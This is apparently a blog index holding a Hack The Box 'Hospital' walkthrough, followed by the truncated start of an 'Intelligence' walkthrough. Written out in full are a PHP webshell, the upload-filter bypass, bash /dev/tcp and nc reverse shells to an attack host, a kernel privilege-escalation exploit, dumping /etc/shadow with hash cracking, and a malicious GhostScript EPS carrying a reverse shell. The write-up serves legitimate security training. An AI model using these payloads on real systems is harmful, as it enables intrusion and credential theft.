        "content": "Hospital Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Hospital How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  07:14:24 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:14 BST Nmap scan report for 10.129.229.189 Host is up (0.042s latency). Not shown: 980 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1801/tcp open msmq 2103/tcp open zephyr-clt 2105/tcp open eklogin 2107/tcp open msmq-mgmt 2179/tcp open vmrdp 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds We safely assume this is a Domain Controller as it\u0026rsquo;s running several domain services, LDAP, SMB, Kerberos \u0026amp; DNS. It\u0026rsquo;s interesting to see that their is a proxy running on 8080 I have never seen these services before so this should be interesting: 2103/tcp open zephyr-clt Google tells me this is a old protocol used for IRC. 2105/tcp open eklogin Some quick googling says this is Kerberos Encrypted login. 2179/tcp open vmrdp This looks to be hyper-v\u0026rsquo;s guest console! There are lots of services we can glean information from here, ldap being the main one. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 11s  07:14:39 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:15 BST Nmap scan report for 10.129.229.189 Host is up (0.039s latency). Not shown: 65506 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA) |_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519) 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-30 13:18:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_http-title: Hospital Webmail :: Welcome to Hospital Webmail |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 1801/tcp open msmq? 2103/tcp open msrpc Microsoft Windows RPC 2105/tcp open msrpc Microsoft Windows RPC 2107/tcp open msrpc Microsoft Windows RPC 2179/tcp open vmrdp? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOSPITAL | NetBIOS_Domain_Name: HOSPITAL | NetBIOS_Computer_Name: DC | DNS_Domain_Name: hospital.htb | DNS_Computer_Name: DC.hospital.htb | DNS_Tree_Name: hospital.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-09-30T13:19:21+00:00 | ssl-cert: Subject: commonName=DC.hospital.htb | Not valid before: 2024-09-29T13:09:46 |_Not valid after: 2025-03-31T13:09:46 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 6404/tcp open msrpc Microsoft Windows RPC 6406/tcp open msrpc Microsoft Windows RPC 6407/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6409/tcp open msrpc Microsoft Windows RPC 6615/tcp open msrpc Microsoft Windows RPC 6633/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu)) |_http-open-proxy: Proxy might be redirecting requests | http-title: Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.55 (Ubuntu) 9389/tcp open mc-nmf .NET Message Framing 26327/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 5.X (91%) OS CPE: cpe:/o:linux:linux_kernel:5.0 Aggressive OS guesses: Linux 5.0 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-09-30T13:19:21 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 292.59 seconds We can confirm we are working with a domain controller as the DNS name is DC.hospital.htb SMB signing is required. LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools  v3.12.6 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  07:16:00 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.229.189 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=hospital,DC=htb CN=Configuration,DC=hospital,DC=htb CN=Schema,CN=Configuration,DC=hospital,DC=htb DC=DomainDnsZones,DC=hospital,DC=htb DC=ForestDnsZones,DC=hospital,DC=htb Supported controls: We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=hospital,DC=htb ldapServiceName: hospital.htb:dc$@HOSPITAL.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hospital,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. SMB 445: I try guest \u0026amp; null sessions to enumerate SMB they have been disabled: DNS 53: I run dnsenum, to enumerate any interesting records: I get duplicate entries, but looking at my hosts file there is no listing for these so unsure what is going on here….. Nothing of note HTTPS 443: Web Mail Service Discovery: There is a hospital webmail application running here: Looking at Wappalyzer: We can see the webmail is running on a service called \u0026ldquo;RoundCube\u0026rdquo; I do a quick search for RoundCube CVE\u0026rsquo;s: https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html I find this RoundCube command injection vulnerability: We will keep hold of this but continue to enumerate Enumerating the Tech Stack of the Web-Mail Server: Enumerate the Tech Stack: whatweb https://$box Directory Busting HTTPS Using Feroxbuster: feroxbuster -u https://10.129.229.189 -k +Note+: If the domain uses self-signed certs we have to pass the -k flag as otherwise ferox will not run as it rejects self-signed certs. We can see that there is a phpmyadmin page running, which is a good target, however it\u0026rsquo;s a 403 so we cannot get access to directly. However we may be able to gain access via the web-proxy that is running? https://10.129.229.189/skins/elastic/watermark.html https://10.129.229.189/skins/elastic/images/logo.svg https://10.129.229.189/program/js/common.min.js https://10.129.229.189/skins/elastic/ui.min.js https://10.129.229.189/program/js/jstz.min.js https://10.129.229.189/skins/elastic/images/favicon.ico https://10.129.229.189/plugins/jqueryui/themes/elastic/jquery-ui.min.css https://10.129.229.189/phpmyadmin https://10.129.229.189/skins/elastic/styles/styles.min.css https://10.129.229.189/skins/elastic/deps/bootstrap.bundle.min.js https://10.129.229.189/program/js/jquery.min.js https://10.129.229.189/program/js/app.min.js https://10.129.229.189/skins/elastic/deps/bootstrap.min.css https://10.129.229.189/plugins/jqueryui/js/jquery-ui.min.js https://10.129.229.189/ https://10.129.229.189/installer =\u0026gt; https://10.129.229.189/installer/ https://10.129.229.189/examples https://10.129.229.189/installer/images =\u0026gt; https://10.129.229.189/installer/imag Attempting to Login: I attempt to login and look at the request in burp: I am getting an unauthorized response, I cannot see why, potentially a red-herring? HTTP-PROXY 8080: Enumerating the Tech Stack of the proxy server: Looking at whatweb this host appears to be running on Ubunutu: whatweb http://$box:8080 This is interesting as it would seem this is running in a VM, which makes sense as there is a hyper V instance (I think), running as port 2179 vmrdp is running. Directory Busting Web Proxy Using Feroxbuster: All of these pages are not directly accessible: http://10.129.229.189:8080/ http://10.129.229.189:8080/images/ http://10.129.229.189:8080/css/ http://10.129.229.189:8080/uploads/ http://10.129.229.189:8080/fonts/ http://10.129.229.189:8080/js/ http://10.129.229.189:8080/vendor/ http://10.129.229.189:8080/vendor/jquery/ http://10.129.229.189:8080/images/icons/ http://10.129.229.189:8080/vendor/animate/ Web Mail Service Discovery on 8080: Webmail login page: I try and enter basic creds of admin:admin however these do not work: Looking at Wappalyzer: We can see the webmail is running also on a service called \u0026ldquo;RoundCube\u0026rdquo; Creating an account: I can see that there is the option to create an account:\nI try admin:admin123:\nThis lets me know that there is an admin user. I check for default credentials for RoundCube and find this post on their support forums:\nThis lets me know that there is no default admin user, so the one that is on here is intentionally set. I make an account:\nbloodstiller:bl00dst1113r Discovering An Upload Portal: After logging in I am given access to an upload portal:\nI test to see what sort of file types it is expecting:\nI can see it\u0026rsquo;s expecting image types however it is running on .php which means we can potentially upload a php webshell. I Upload a valid picture to see what happens:\nI then try and access it via the uploads directory which we found earlier when dirbusting: It is not accessible. Looking at the request and response in burp we can see that it was a valid upload: This leads me to believe the uploaded file is being processed/renamed on upload. Future bloodstiller here, no this is wrong. THis is because I put .jpg in my request instead of .jpeg. Always copy and paste guys Uploading a webshell:\nI create a php webshell: \u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt; I upload the php webshell: It\u0026rsquo;s caught and errors out: I check if there is anything telling in the error response, but none that I can see: I append .jpg to my php webshell to see if I can bypass the upload restrictions: It\u0026rsquo;s a success: This is good as it means filtering is only happening in the browser, which means we can see if any other extensions will be considered valid and enable us to upload a webshell. Fuzzing for valid extensions: I initiate another upload and capture it in burp \u0026amp; send to intruder: I set the extension as my injection/fuzzing point: I use the web-extensions.txt list from Seclists: Looking at the results, we can see that the extension phar has a success.php response: What this means is we should be able to append .phar to our shell and have it bypass any restrictions. What is a phar file? A PHAR file is a packaged PHP Archive so it can be read and processed \u0026amp; executed by the server that is running PHP. I want to point out that there are also other options here that also had a valid success response, I am just opting to use .phar as I have had the most experience with this type of file. Trying to get a web-shell by bypassing file-upload restrictions: I rename my shell to shell.phar for no other reason than convenience. In an engagement I would give this a hashed long name so no-one else could stumble upon it. I upload it, it uploads successfully. I attempt to use \u0026amp; run it \u0026amp; nothing….. I try without arguments too \u0026amp; nothing: Back to the drawing board…. Enumerating the PHP Server Some More: So what do we know?\nIn situations like this, it\u0026rsquo;s good to go over what we do know about the host \u0026amp; service: We know we can upload a file. We know there is a file uploads folder, where we (believe these files are stored) We know we can upload files with the .phar extension. We know that the server is running php Let\u0026rsquo;s enumerate the server more and see if we can find anymore information about the php service running:\nAs we know the above we can actually create a file that will call the phpinfo function when uploaded \u0026amp; executed via the web server echo \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; phpinfo.phar This script will display all the PHP configuration details, including version, loaded extensions, server info, and more. I upload it and visit the url:\nWe can see it works, however there is also a list of disabled functions and these functions are what we would typically utilize for web-shells; however weevely has the ability to bypass these function restrictions using it\u0026rsquo;s audit_disablefunctionbypass feature!! So we can use this to get a webshell https://github.com/epinna/weevely3/wiki/Bypass-disabled-system-shell-functions-via-mod_cgi-and-.htaccess 2. Foothold: Using Weevley To Get A Web Shell: Generate our Shell:\nWeevly is built into Kali by default so we can just call it as so: weevely generate \u0026lt;password\u0026gt; \u0026lt;outPutFile\u0026gt; weevely generate bl00dst111er medrec.phar I upload the shell:\nAccessing the Shell:\nsudo weevely http://hospital.htb/uploads/medrec.phar bl00dst111er So as you can see below there are alot of errors. I actually did some troubleshooting with this. I ended up cloning the repo, setting up a python venv, installing all deps to that and trying again \u0026amp; I still go the same errors and it would not run with sudo. So if in doubt just run with sudo and it should work. Running Commands:\nWe need to run an initial command to get access to the shell: Just to make it clear, we are in the VM that is running ubuntu. So we need to find a way to escape or gather information we can use elsewhere. I try and run some commands but it gets a 404 and times out:\nI did notice that when trying to access my phpinfo enumeration file that it also times out, which leads me to believe there is some sort of timeout in place for uploaded files. Getting around the timeout Using Weevely\u0026rsquo;s built in reverse shell: I believe the easiest way to get around the time out will be to on connection immediately trigger a manual reverse shell back to ourselves from the weevley shell and background the task to ensure the connection remains. Prepare my listener:\nnc -nvlp 443 +Note+: I use 443 so the traffic at least looks legitimate. Prepare my reverse shell statement to paste into the weevley shell:\nbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1' +Note+: I do this as it\u0026rsquo;s time-sensitive \u0026amp; I want to easily copy and paste as opposed to typing something out and getting a type-o. Connect via weevley:\nsudo weevely http://10.129.229.189:8080/uploads/rec.phar bl00dst111er Trigger the reverse shell:\nCaught: +Note+: Full transparency here, I tried multiple ways to get this to work, including the below. However the only way I could get a connection was using the above sub-shell method. I am showing you this as I want you to know that sometimes you have to just keep trying to find a viable path to make things work. /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 /bin/sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 nc 10.10.14.27 443 -e /usr/bin/sh \u0026amp; nc 10.10.14.27 443 -e /usr/bin/bash \u0026amp; nc 10.10.14.27 443 -e /bin/bash \u0026amp; I also tried weevleys inbuilt reverse-tcp shell and that would not work Detailed Breakdown Of The Reverse Shell: Bash Sub-Shell:\nbash -c Runs the command bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 within a new instance of the bash shell. The -c option allows us to pass a string as a command to be executed. bash -i Launches an interactive instance of the Bash shell. Redirection Operators:\n\u0026gt;\u0026amp;\nRedirects both standard output stdout and standard error stderr to the target in this case, our attack host, /dev/tcp/10.10.14.27/443. /dev/tcp/\nThis is a special file in Linux systems that allows network communication. By using /dev/tcp/ with an IP address and port 10.10.14.27:443, the shell sends its output to our attack host at that IP and port. This essentially establishes a TCP connection to our attack machine 10.10.14.27 on port 443. 0\u0026gt;\u0026amp;1:\nRedirects standard input stdin from the same file descriptor as standard output stdout. This allows the shell to receive commands from our attack machine and execute them. Finding Mysql Creds in config.php: I check the config.php file in /var/www/html \u0026amp; find the creds for the msql instance hardcoded in the file: We know there is a db called hospital too, so this is worth checking out. Understanding the Upload Mechansim: Uploads Folder:\nI check the uploads folder \u0026amp; as suspected it is now empty, leading me to believe there is some sort cron job clearing these files. This is interesting find though as it means cron jobs are running, so that is something we should enumerate further. Reading upload.php\nIt\u0026rsquo;s always interesting to look at the logic behind upload mechanisms once we exploit them, I find as a means to learn. Looking at the code we can see they have opted for a blacklist approach to extensions, black-lists can work however as we have seen just missing one extension render them useless. Defenders have to get it right 100% of the time, as attackers we only need to be right once. A better approach would be to have a white-list of extensions, so that the upload page only accepts uploads for say .pdf files. This would eliminate this attack vector and also be far easier to maintain from an administration point of view. Trying to connect to the mysql instance: I verify the mysql server is running \u0026amp; accessible from the VM (it has to be as it\u0026rsquo;s not running on the bare-metal host) netsat -tuln I try various ways to initiate a connection to it but each time it fails in some way: These are only a few of many different attempts \u0026amp; ways I tried to use to connect to the mysql instance, however none of them worked. Discovering another User: Finding Dr Williams User:\nI find a user drwilliams in the /home folder however their home folder in inaccesible. Checking etc/passwd see that the users name is actually Lucy Williams\nI take a note of this as it may be used later. I try cred stuffing the found creds so far but there are no hits:\nDiscovering a Tmux Session: I see that there appears to be a tmux session listed in /tmp. Existing tmux sessions can be an easy privesc path as if they are set to run permnantley we can attach them \u0026amp; then scroll through whatever commands were entered previously, these could be things such as clear text creds so it\u0026rsquo;s always good to check existing sessions. I Try and attach the session however when I try and initiate tmux to enter this session it does not work due to the nature of the terminal: Before you ask, upgrading to python terminal does not work nor does upgrading the stability of the terminal using script I did also try and create a meterpreter shell which connected however I was still unable to attach the TMUX session. 3. VM Privilege Escalation: Discovering the Kernel is vulnerable to exploitation: I list the kernel version: uname -a After some quick searching I find that this actually vulnerable to this exploit which will allow us to privesc: https://github.com/Synacktiv/CVE-2023-35001 Building the \u0026amp; transferring the exploit: I clone the exploit:\ngit clone https://github.com/synacktiv/CVE-2023-35001.git Following the instructions I build it:\nmake This leaves me with a file called lpe.zip that I can transfer to the target. Checking the host it doesn\u0026rsquo;t have zip or unzip:\nLuckily the exploit retains the exploit \u0026amp; wrapper files need so we can just transfer those to the target. Using the CVE-2023-35001 exploit to privesc to root: I make the exploit \u0026amp; wrapper executable:\nchmod +x exploit chmod +x wrapper I trigger the exploit:\n./exploit Enumerating as Root: SSH: I check drwilliams \u0026amp; root .ssh folders but they are empty :( Connecting to the mysql instance as root! Connect:\nmysql -u root -p'\u0026lt;Redacted\u0026gt;' List the databases:\nshow databases; Select the hospital Database:\nuse hospital; Show the tables in the hospital database:\nshow tables; It has a users table so we could get a some creds! Show columns from the users tables\nshow columns from users; Show the contents of the columns:\nselect * from users; Cracking the hashes admin hash: I check the hash type by using: https://hashes.com It says they are bcrypt $2*$, Blowfish (Unix) Checking hashcats website we can see these hashes use mode 3200\nI start hashcat \u0026amp; crack the admin hash almost immediately:\nhashcat -m 3200 Mysql-Hashes.txt ~/Wordlists/rockyou.txt I also get the patient hash. I try cred stuffing with these and accessing the webmail but no access. Onto the next thing….. Dumping Shadow Hashes: As I am root I can dump the /etc/shadow:\nI copy the /etc/passwd \u0026amp; /etc/shadow locally. I use unshadow to extract the hashes: unshadow passwd shadow \u0026gt; unshadowed.hashes I am going to focus on cracking the drs hash as I already have access to the root account \u0026amp; this is a VM so unless I can perform a VM escape a lateral move seems like the logical approach.\nVM escapes are possible but as far as I am aware, more advanced than this box is labelled. Cracking Dr Williams Hashed Password: I find out the format of the hash on hashes.com\nIt\u0026rsquo;s sha512crypt: Checking hashcat\u0026rsquo;s website I can see that it\u0026rsquo;s mode 1800:\nI copy the hash to a seperate file \u0026amp; start cracking with hashcat:\nhashcat -m 1800 drhash ~/Wordlists/rockyou.txt It cracks!! I try the creds on SMB but no use again. Accessing Dr Williams Email: I try all the creds in the webmail portal \u0026amp; get in Dr Williams creds.\nPassword re-use, naughty, naughty Dr Williams. I find that the RoundCube version running is 1.6.4\nI can see that the one email in the inbox is from drbrown, I add their name to my found usernames list.\nGhostScript file request:\nIn the email the Dr Brown is requesting a file in the .eps format for GhostScript from Dr Williams. Looking into GhostScript I can see it\u0026rsquo;s an interpreter for PostScript (PS) and Portable Document Format (PDF) files, enabling viewing, printing, and converting them. Finding a GhostScript EPS CVE:\nLooking online it is possible to trigger a reverse shell via a malicious .eps file with GhostScript. This would mean if we can get Dr Brown to open it we can get a reverse shell. https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?tab=readme-ov-file 4. Host Foothold: Gaining Access to the host via Malicious .eps GhostScript Exploit: Looking at the readme for the GhostScript public exploit CVE_2023_36664, we have alot of options. We cannot use the standard --revshell command as that is for when executed on a unix host only. However we can generate our own payload and have this placed in an eps file.\nI use https://revhells.com to generate a powershell reverse shell and base64 encode it:\nI use the exploit to generate the malicious .eps file:\npython3 CVE_2023_36664_exploit.py -g -p \u0026quot;\u0026lt;payload\u0026gt;\u0026quot; -x eps I start my nc listener:\nnc -nvlp 53 Respond in the email client \u0026amp; attach the malicious.eps file:\nWithin seconds I have a reverse shell:\n+Note+: This is one of the coolest boxes I have done. The creativity is amazing.\nFinding Hard-Coded Creds In ghostscript.bat file: As soon as I connect I see there is a file called ghostscript.bat in the Documents folder of drbrown.\nLooking at the contents I can see that it has hard-coded credentials:\nI verify these are valid with netexec \u0026amp; evil-winrm:\nAs they are valid with evil-winrm this gives us an easy way for re-entry onto the host. I check my privs:\nI see I have the ability add workstations to the domain. If I have delegation rights this could be a valid attack path. Lets run bloodhound to find out. Running Bloodhound:\npython3 bloodhound.py -dc dc.hospital.htb -c All -u $user -p $pass -d hospital.htb -ns $box I find that our user is part of the Remote Desktop users group:\nHowever I do not have delegation privs. Let\u0026rsquo;s connect to the host and see if we can find anything there. 3. Privilege Escalation: Connecting Via RDP to the target: As we are part of the Remote Desktop Users Group, I connect to the host: xfreerdp /v:$box /u:$user /p:$pass Capturing Credentials from the Selenium WebDriver: Hard Coded Creds In Internet Explorer:\nAs soon as I login, an internet explorer window opens and it looks like the credentials are being entered in by a script, manually typing each character in. I wait a minute and process begins again, which means it\u0026rsquo;s looping. Discovering Selenium is being used on the host for automating credential entry:\nInvestigating further when the loop starts again a powershell window opens and displays the below. The script is using \u0026ldquo;selenium\u0026rdquo; which is a framework used for automating web browsers. Redirecting the Selenium output to capture the Adminsitrator Username \u0026amp; Password:\nAs the creds are being manually typed, all we have to do is have the text redirect to us to something we control to capture the credentials. On the next loop I open notepad and when it starts entering the creds in internet explorer I select Notepad \u0026amp; it starts typing the creds there 4. Ownership: I check the Administrator creds to see if they have been re-used:\nBoom, we have ownership I connect via evil-winrm \u0026amp; I get the root flag:\nIt wouldn\u0026rsquo;t be full ownership unless I dump the ntds.dit file to get all the hashes now would it?\nLessons Learned: What did I learn? I learned about using the GhostScript eps exploit, I was not even aware that existed so that was cool. I learned that you can re-direct selenium output (this is important as I have used selenium in previous projects, never to enter anything sensitive but this interesting none-the less) I learned not to do boxes when I get sleepy. I got caught for a long time looking for the correct foothold. I also learned that you can be really creative when making these boxes, this one was honestly amazing. What silly mistakes did I make? I was sleepy when I started so overlooked a pretty obvious foothold/entrypoint even though it was staring me in the face. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "tags": ["Box","HTB","Medium","Active Directory","Windows","Kerberos","KCD","DNS",],
        "content": "Hack The Box Intelligence Walkthrough/Writeup: https://app.hackthebox.com/machines/Intelligence How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 16:27:13 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:27 BST Nmap scan report for 10.129.95.154 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP\nkali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 10s 🕙 16:27:28 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:28 BST Nmap scan report for 10.129.95.154 Host is up (0.078s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-27 22:30:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:28+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:31+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:30+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, 